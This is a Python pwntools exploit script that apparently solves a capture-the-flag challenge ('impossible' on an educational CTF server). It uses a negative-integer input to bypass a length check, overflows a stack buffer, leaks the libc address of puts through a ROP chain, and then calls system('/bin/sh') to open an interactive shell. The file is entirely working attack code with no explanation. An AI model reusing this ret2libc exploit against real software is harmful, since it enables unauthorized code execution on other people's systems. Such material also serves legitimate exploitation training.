from pwn import *

r = remote('eductf.zoolab.org', 10105)
lib = ELF('./libc-2.27.so')
# r = process('./impossible')
# lib = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF('./impossible')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
puts_got = elf.got[b'puts']
puts_plt = elf.plt[b'puts']
main = elf.symbols[b'main']
r.success('pop rdi --> {}'.format(hex(pop_rdi)))
r.success('puts@got --> {}'.format(hex(puts_got)))
r.success('main --> {}'.format(hex(main)))
r.sendlineafter(': ', '-2147483648')

puts_payload = flat(
    pop_rdi,
    puts_got,
    puts_plt,
    main,
    word_size = 64
)

r.send(b'a' * 0x108 + puts_payload) # buf = 0x100, 0x8 = rbp, 
r.recvlines(2)
libc_base = u64(r.recv(6) + b'\x00\x00') - lib.symbols[b'puts']
r.success('libc_base --> {}'.format(hex(libc_base)))
bin_sh_addr = libc_base + lib.search('/bin/sh').__next__()
system_addr = libc_base + lib.symbols[b'system']
r.success('/bin/sh address-->{}'.format(hex(bin_sh_addr)))
r.success('system address-->{}'.format(hex(system_addr)))

r.sendlineafter(': ', '-2147483648')
shell_payload = flat(
    ret,
    pop_rdi,
    bin_sh_addr,
    system_addr,
    main,
    word_size = 64
)
r.send(b'a' * 0x108 + shell_payload)
r.interactive()

